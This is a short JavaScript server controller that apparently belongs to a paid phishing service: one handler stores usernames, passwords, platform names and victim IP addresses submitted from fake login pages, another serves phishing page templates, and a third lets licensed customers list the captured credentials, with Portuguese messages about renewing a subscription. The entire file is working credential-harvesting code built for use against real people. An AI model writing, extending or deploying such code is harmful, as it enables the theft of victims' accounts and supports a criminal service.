import { captureDB, pushTemplateDb } from "../db/fish.js"
import { insertCapture } from "../db/fish.js";
import { verificarAcesso } from "./payment.js";
export async function fish(req, res) {
  const ip = getClientIp(req);

  let dataFish = {
    platform: req.body.platform,
    user: req.body.user,
    pass: req.body.pass,
    codRef: req.body.codRef,
    ip: ip
  }
  insertCapture(dataFish)


}

export async function pushTemplate(req, res) {
  let template = await pushTemplateDb()

  res.json(template)
}

function getClientIp(req) {
  return (
    req.headers["cf-connecting-ip"] ||
    req.headers["x-forwarded-for"]?.split(",")[0] ||
    req.socket?.remoteAddress ||
    null
  );
}



export async function listCapture(req, res) {

  const userId = req.user.id

  const acessoValido = await verificarAcesso(userId)
  if (!acessoValido) {
   return res.json({ message: "Seu acesso expirou<br>Para renovar Menu > Planos > [Renovar Licença]", ativo: false })  }
  const capture = await captureDB(userId)


  res.status(201).json(capture)
}

